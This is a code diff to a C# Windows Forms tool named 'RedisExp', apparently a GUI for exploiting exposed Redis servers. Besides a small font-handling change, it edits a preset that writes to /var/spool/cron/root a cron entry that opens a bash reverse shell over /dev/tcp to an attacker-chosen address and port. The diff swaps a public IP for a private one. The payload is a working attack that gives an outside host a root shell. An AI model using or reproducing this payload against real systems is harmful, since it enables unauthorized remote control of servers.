@@ -15,6 +15,11 @@ namespace RedisExp
             
         }
 
+        private void contentBox_TextChanged(object sender, EventArgs e) {
+            this.contentBox.LanguageOption = RichTextBoxLanguageOptions.UIFonts;
+        }
+
+
         private void expBox_TextChanged(object sender, EventArgs e)
         {
             /*
@@ -35,7 +40,7 @@ namespace RedisExp
             else if (expBox.SelectedIndex == 2)
             {
                 pathBox.Text = "/var/spool/cron/root";
-                contentBox.Text = "* * * * * bash -i >& /dev/tcp/49.4.6.236/18085 0>&1";
+                contentBox.Text = "* * * * * bash -i >& /dev/tcp/192.168.2.2/9999 0>&1";
             }
         }
 
